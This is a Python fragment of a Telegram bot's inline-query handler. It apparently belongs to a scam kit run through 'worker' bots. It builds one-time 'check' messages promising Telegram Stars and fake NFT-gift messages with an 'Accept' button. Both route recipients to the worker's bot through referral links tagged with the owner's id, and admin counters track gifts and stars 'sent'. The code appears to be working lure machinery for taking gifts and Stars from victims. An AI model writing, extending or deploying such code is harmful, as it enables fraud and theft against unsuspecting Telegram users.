async def update_admin_stats(session, admin: Admin, nft=0, regular=0, stars=0):
    admin.gifts_unique_sent += nft
    admin.stars_sent += stars

    admin.daily_gifts_unique += nft
    admin.daily_stars_sent += stars

    await session.commit()

def gen_check_code() -> str:
    return secrets.token_urlsafe(8).replace("-", "_").replace(".", "_")

async def handle_webhook_inline_query(data, bot: Bot, token: str, request):
    async with Session() as session:
        userbot = await session.scalar(
            select(WorkerBot)
            .where(WorkerBot.token == token)
        )
        if not userbot or not userbot.username:
            return web.Response()

        custom_gift = None
        slugs = []

        if userbot.custom_template_id:
            custom_gift = await session.get(CustomGift, userbot.custom_template_id)
            if custom_gift:
                try:
                    slugs = json.loads(custom_gift.slugs)
                except Exception:
                    slugs = []

    dp = Dispatcher(storage=MemoryStorage())
    router = Router()

    @router.inline_query(F.query)
    async def inline_handler(inline_query: InlineQuery):
        query_text = inline_query.query.strip()
        results = []

        if re.fullmatch(r"\d+", query_text):
            if userbot.base_template_id != "base_6":
                await inline_query.answer(
                    [],
                    cache_time=1,
                    is_personal=True,
                    switch_pm_text="Создание чека доступно только в шаблоне Base 6",
                    switch_pm_parameter="need_base_6"
                )
                return

            stars_amount = int(query_text)
            if stars_amount <= 0:
                await inline_query.answer([], cache_time=1, is_personal=True)
                return

            price_usd = stars_amount * STAR_PRICE
            link_url = "https://t.me/portals_community"

            code = gen_check_code()
            async with Session() as s:
                s.add(StarCheck(code=code, stars_amount=stars_amount))
                await s.commit()

            bot_url = f"https://t.me/{userbot.username}?start=check_{code}"

            results.append(
                InlineQueryResultArticle(
                    id=f"star-check-{code}",
                    title=f"Чек на {stars_amount} ⭐️ (одноразовый)",
                    description=f"${price_usd:.2f}",
                    input_message_content=InputTextMessageContent(
                        message_text=(
                            f"💎 <b><a href='{link_url}'>Чек</a></b> "
                            f"на {stars_amount} ⭐️ <b>(${price_usd:.2f}).</b>"
                        ),
                        parse_mode="HTML",
                        disable_web_page_preview=True
                    ),
                    reply_markup=InlineKeyboardMarkup(
                        inline_keyboard=[
                            [InlineKeyboardButton(
                                text=f"Получить {stars_amount} ⭐️",
                                url=bot_url
                            )]
                        ]
                    )
                )
            )

        else:
            if custom_gift and slugs:
                for slug in slugs:
                    slug = slug.strip().replace('"', '').replace("'", "")
                    title = slug.split("-")[0]
                    message_text = custom_gift.message_text or "<i>ТЕСТ</i>"
                    button_text = custom_gift.button_text or "🎁 Принять"
                    url = f"https://t.me/nft/{slug}"
                    ref_url = f"https://t.me/{userbot.username}?start=ref_{userbot.owner_id}_{slug}"

                    results.append(
                        InlineQueryResultArticle(
                            id=f"{slug}-{title}",
                            title=title,
                            input_message_content=InputTextMessageContent(
                                message_text=f"<b><a href='{url}'>{title}</a></b>\n\n{message_text}",
                                parse_mode="HTML",
                            ),
                            reply_markup=InlineKeyboardMarkup(
                                inline_keyboard=[
                                    [InlineKeyboardButton(text=button_text, url=ref_url)]
                                ]
                            )
                        )
                    )

        await inline_query.answer(results or [], cache_time=1, is_personal=True)

    dp.include_router(router)
    handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
    return await handler.handle(request)